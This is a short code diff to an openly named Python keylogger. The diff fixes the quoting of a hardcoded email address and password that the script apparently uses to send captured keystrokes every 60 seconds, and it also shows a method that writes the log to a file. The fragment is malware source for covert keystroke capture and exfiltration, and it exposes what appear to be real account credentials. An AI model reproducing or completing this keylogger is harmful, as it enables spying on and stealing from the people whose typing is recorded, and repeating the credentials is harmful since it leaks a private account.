@@ -5,8 +5,8 @@ from threading import Timer
 from datetime import datetime
 
 SEND_REPORT_EVERY = 60
-EMAIL_ADDRESS = jul00howell@gmail.com
-EMAIl_PASSWORD = Julian00Howell
+EMAIL_ADDRESS = "jul00howell@gmail.com"
+EMAIl_PASSWORD = "Julian00Howell"
 
 class Keylogger:
     def __init__(self, interval, report_method="email"):
@@ -38,4 +38,3 @@ class Keylogger:
     def report_to_file(self):
         with open(f"{self.filename}.txt","w") as f:
             print(self.log, file = f)
-            
